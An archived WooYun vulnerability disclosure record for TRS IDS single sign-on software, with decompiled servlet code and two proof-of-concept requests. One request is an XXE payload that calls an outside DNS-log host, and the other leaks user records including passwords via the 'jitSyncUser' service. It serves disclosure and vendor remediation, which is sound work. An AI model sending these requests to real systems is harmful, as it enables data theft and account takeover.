{"id": 88131, "wybug_id": "wooyun-2016-0188473", "wybug_title": "TRS(ids新老版本)设计缺陷(xxe/用户信息泄露包括密码等)                                      ", "wybug_corp": "北京拓尔思信息技术股份有限公司", "wybug_author": "menmen519", "wybug_date": "2016-03-24 11:59", "wybug_open_date": "2016-06-26 11:50", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-03-31：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-05-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-26：\t细节向公众公开  简要描述： TRS(ids)设计缺陷(xxe/用户信息泄露包括密码)，好久没有发过漏洞了，突然上来看了看，发现漏洞提交页面都变了 详细说明：  首先我们看看web.xml配置文件:\n<servlet>\t\t<servlet-name>ServiceServlet</servlet-name>\t\t<servlet-class>com.trs.idm.admin.service.ServiceServlet</servlet-class>\t</servlet>    \t<servlet-mapping>\t\t<servlet-name>ServiceServlet</servlet-name>\t\t<url-pattern>/service</url-pattern>\t</servlet-mapping>\n跟进ServiceServlet\nprotected void service(HttpServletRequest request, HttpServletResponse response)        throws ServletException, IOException    {        if(\"GET\".equalsIgnoreCase(request.getMethod()) && StringHelper.isEmpty(request.getQueryString()))        {            String responMsg = \"It works!\";            if(serviceHandlerManager == null)                responMsg = \"It didn't work!\";            response.getWriter().print(responMsg);            response.getWriter().flush();            return;        }        String hanlderType = RequestUtil.getParameterAndTrim(request, \"idsServiceType\");        LOG.debug((new StringBuilder(\"hanlder type in request is: \")).append(hanlderType).toString());        if(serviceHandlerManager == null)        {            LOG.warn((new StringBuilder(\"serviceHandlerManager is null! \")).append(idmServer.getStartError()).toString());            if(\"remoteapi\".equals(hanlderType))            {                response.setContentType(\"text/xml;charset=utf-8\");                setResponseType(request, response);                String responseMsg = ProcessorHelper.getErrorResponseAsXML(-2, idmServer.getStartError().toString(), com/trs/idm/admin/service/ServiceServlet.getName(), null);                sendResponse(response, responseMsg);            }            return;        }        IServiceHandler serviceHandler = serviceHandlerManager.getServiceHanlder(hanlderType);        if(serviceHandler == null)        {            LOG.warn((new StringBuilder(\"can not find hanlder by type: \")).append(hanlderType).toString());            return;        } else        {            serviceHandler.service(request, response);            return;        }    }\n通过get方式获取一个服务的名称idsServiceType=xxxxx然后这里去查询IServiceHandler serviceHandler = serviceHandlerManager.getServiceHanlder(hanlderType);服务存在否\npublic IServiceHandler getServiceHanlder(String serviceHanlderName)    {        return (IServiceHandler)ServiceHanldersMap.get(serviceHanlderName);    }    public Map getAllServiceHanlders()    {        return ServiceHanldersMap;    }    public void start(IDSContext idsCtx)        throws IdMException    {        IServiceHandler ssoAPIServiceHandler = new SSOAPIServiceHanlder(idsCtx);        ssoAPIServiceHandler.start();        IServiceHandler coAppStatusMonitorServiceHanlder = new CoAppStatusMonitorServiceHanlder(idsCtx);        coAppStatusMonitorServiceHanlder.start();        IServiceHandler v5httpHandler = new HTTPAPIAdaptorHandler(idsCtx);        v5httpHandler.start();        IServiceHandler v5httpssoHandler = new HTTPSSOAPIHandler(idsCtx);        v5httpssoHandler.start();        IServiceHandler realNameAuthServiceHandler = new RealNameAuthenticationServiceHandlerV2(idsCtx);        realNameAuthServiceHandler.start();        IServiceHandler sinaWeiboLoginHandler = new SinaWeiboLoginServiceHandler(idsCtx);        sinaWeiboLoginHandler.start();        IServiceHandler renrenLoginHandler = new RenRenLoginServiceHandler(idsCtx);        renrenLoginHandler.start();        IServiceHandler qqLoginHandler = new QQLoginServiceHandler(idsCtx);        qqLoginHandler.start();        IServiceHandler kaixinLoginHandler = new KaiXinLoginServiceHandler(idsCtx);        kaixinLoginHandler.start();        IServiceHandler doubanLoginHandler = new DoubanLoginServiceHandler(idsCtx);        doubanLoginHandler.start();        IServiceHandler openAuthLoginHandler = new OpenAuthLoginServiceHandler(idsCtx);        openAuthLoginHandler.start();        IServiceHandler idsServerStatusMonitorServiceHanlder = new IdsServerStatusMonitorServiceHanlder(idsCtx);        idsServerStatusMonitorServiceHanlder.start();        IServiceHandler federatedAuthHandler = new FederatedAuthHandler(idsCtx);        federatedAuthHandler.start();        IServiceHandler jitSyncUser = new JitSynchUserServiceHandler(idsCtx);        ServiceHanldersMap = new HashMap();        ServiceHanldersMap.put(\"remoteapi\", v5httpHandler);        ServiceHanldersMap.put(\"httpssoservice\", v5httpssoHandler);        ServiceHanldersMap.put(\"ssoapi\", ssoAPIServiceHandler);        ServiceHanldersMap.put(\"coAppStatusMonitor\", coAppStatusMonitorServiceHanlder);        ServiceHanldersMap.put(\"realNameAuthentication\", realNameAuthServiceHandler);        ServiceHanldersMap.put(\"idsStatusMonitor\", idsServerStatusMonitorServiceHanlder);        ServiceHanldersMap.put(\"jitSyncUser\", jitSyncUser);        ServiceHanldersMap.put(\"openAuthLogin\", openAuthLoginHandler);        ServiceHanldersMap.put(\"sinaWeiboLogin\", sinaWeiboLoginHandler);        ServiceHanldersMap.put(\"renrenLogin\", renrenLoginHandler);        ServiceHanldersMap.put(\"qqLogin\", qqLoginHandler);        ServiceHanldersMap.put(\"kaixinLogin\", kaixinLoginHandler);        ServiceHanldersMap.put(\"doubanLogin\", doubanLoginHandler);        ServiceHanldersMap.put(\"federatedAuth\", federatedAuthHandler);        ServiceHanldersMap.put(\"mockBabyTreeServer\", new MockBabyTreeAppServer(idsCtx));        LOG.info(\"MemoryServiceHanlderManager start\");    }\n发现了 存在这么多服务，我们最主要的看jitSyncUser 这个服务跟进到JitSynchUserServiceHandler\npublic void service(HttpServletRequest request, HttpServletResponse response)        throws ServletException, IOException    {        request.setCharacterEncoding(\"UTF-8\");        response.setContentType(\"text/html; charset=UTF-8\");        response.setHeader(\"Pragma\", \"no-cache\");        response.setHeader(\"Cache-Control\", \"no-store\");        response.setDateHeader(\"Expires\", -1L);        InputStream in = request.getInputStream();        byte buf[] = new byte[2048];        in.read(buf);        in.close();        String xml = (new String(buf, \"UTF-8\")).trim();        if(xml == null || xml.equals(\"\"))        {            error(response, \"XML\\u6587\\u6863\\u4E3A\\u7A7A\");            return;        }        try        {            Document doc = DocumentHelper.parseText(xml);            Element root = doc.getRootElement();            synchUser(response, root, xml);        }        catch(DocumentException e)        {            error(response, \"XML\\u6587\\u6863\\u9519\\u8BEF\");        }        catch(Exception e)        {            error(response, \"XML\\u6587\\u6863\\u9519\\u8BEF\");        }    }\n这里直接通过流读取一个xml，然后交给synchUser方法处理\nprivate void synchUser(HttpServletResponse response, Element element, String xml)        throws IOException, IdMException    {        User user = getBean(element);        String action = getAction(element);        String status = \"\";        if(\"app\".equalsIgnoreCase(action))            userManager.addUser(user, \"\");        else        if(\"mod\".equalsIgnoreCase(action))            userManager.updateUser(user);        else        if(\"active\".equalsIgnoreCase(action))        {            user.setActived(true);            userService.noticeEnableOrDisableUser(true, user);        } else        if(\"unactive\".equalsIgnoreCase(action))        {            user.setActived(false);            userService.noticeEnableOrDisableUser(false, user);        } else        if(\"del\".equalsIgnoreCase(action))            userManager.removeUser(user);        else        if(\"dip\".equalsIgnoreCase(action))        {            User newUser = userManager.findByName(user.getUserName(), \"ids_internal\");            if(newUser != null)            {                String encode = buildReturnXml(newUser);                response.getWriter().print(encode);                return;            }        } else        if(\"check\".equalsIgnoreCase(action))        {            String userExist = userManager.isUserExist(user.getUserName(), \"\", true);            status = userExist;        } else        if(\"check-up\".equalsIgnoreCase(action))        {            status = checkUserInfo(user);        } else        {            error(response, \"\\u8BF7\\u6C42\\u7684\\u65B9\\u6CD5\\u65E0\\u6548\");            return;        }               StringBuffer sb = new StringBuffer(\"<?xml version='1.0' encoding='UTF-8' ?><Inter-Xinhua Version='1.0'>\");        if(\"check\".equals(action))        {            if(status.equals(\"true\") || status.equals(\"false\"))                sb.append(String.format(\"<Error>false</Error><Exist>%s</Exist>\", new Object[] {                    status                }));            else                sb.append(String.format(\"<Error>true</Error><ErrorMessage>%s</ErrorMessage>\", new Object[] {                    status                }));        } else        if(status.equals(\"\"))            sb.append(\"<Error>false</Error>\");        else            sb.append(String.format(\"<Error>true</Error><ErrorMessage>%s</ErrorMessage>\", new Object[] {                status            }));        sb.append(\"</Inter-Xinhua>\");        response.getWriter().print(sb.toString());    }\n那么看看第一个漏洞点：\ntry        {            Document doc = DocumentHelper.parseText(xml);            Element root = doc.getRootElement();            synchUser(response, root, xml);        }\n这里直接对xml进行了解析，所以存在xxe漏洞，为了测试，我们cloudeye 演示一下\nPOST /ids/service?idsServiceType=jitSyncUser HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: trsidsssosessionid=2382B8AE9E8FB5B441212CE2595F963E**.**.**.**X-Forwarded-For: **.**.**.**Connection: keep-aliveContent-Type: multipart/form-data; boundary=---------------------------1988224119974Content-Length: 196<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE xdsec [<!ELEMENT methodname ANY ><!ENTITY xxe SYSTEM \"http://mm1111.88d400.dnslog.info\" >]><methodcall><methodname>&xxe;</methodname></methodcall>\n\n\n下面的synchUser,因为接口是统一有问题的，所以这里就举其中一个信息泄露例子吧\nPOST /ids/service?idsServiceType=jitSyncUser HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: trsidsssosessionid=2382B8AE9E8FB5B441212CE2595F963E**.**.**.**X-Forwarded-For: **.**.**.**Connection: keep-aliveContent-Type: multipart/form-data; boundary=---------------------------1988224119974Content-Length: 381<?xml version=\"1.0\" encoding=\"UTF-8\"?><UserInfo><Method>dip</Method><AppId>dbg</AppId><ID>test</ID><Password>xxxxx</Password><CPassword>xxxxx</CPassword><Name>xxxxxx</Name><Domain></Domain><TEL>02965474561</TEL><PostCode>710000</PostCode><Mobile>15802991645</Mobile><Address>test123</Address><E-mail>test123@**.**.**.**</E-mail><UserType>dbg</UserType><ES></ES><DES></DES></UserInfo>\n\n\n其他的 比如任意用户密码修改，用户激活等等这里就不举例子了案例:**.**.**.****.**.**.****.**.**.****.**.**.****.**.**.****.**.**.**   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2016-03-28 11:45 厂商回复： 感谢反馈，问题于几个月前已通过其他渠道获悉，并就已实施的关键项目做了修复对接，标准产品的补丁将很快发布。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-24 11:59 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:307 漏洞数:70        | baozisec)\t\t \n  好久不见    \n     2016-03-24 12:01 |    \t\t狗狗侠  \t\t\t( 普通白帽子  |\t\t\t        Rank:518 漏洞数:58        | 我是狗狗侠)\t\t \n  漏洞分析的仔细，奖励速度跟上    \n     2016-03-24 12:41 |    \t\t幻老头儿 \t\t\t( 普通白帽子  |\t\t\t        Rank:285 漏洞数:63        | 新手上路。)\t\t \n  我是来膜拜大神的    \n     2016-03-24 13:26 |    \t\tVinc \t\t\t( 普通白帽子  |\t\t\t        Rank:383 漏洞数:58        | 提莫队长正在待命！)\t\t \n  看看    \n     2016-03-24 15:28 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1754 漏洞数:269        | 以大多数人的努力程度之低，根本轮不到去拼...)\t\t \n  前排关注。    \n     2016-03-28 13:26 |    \t\t盛大网络(乌云厂商)\t\t \n  分析的不错    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}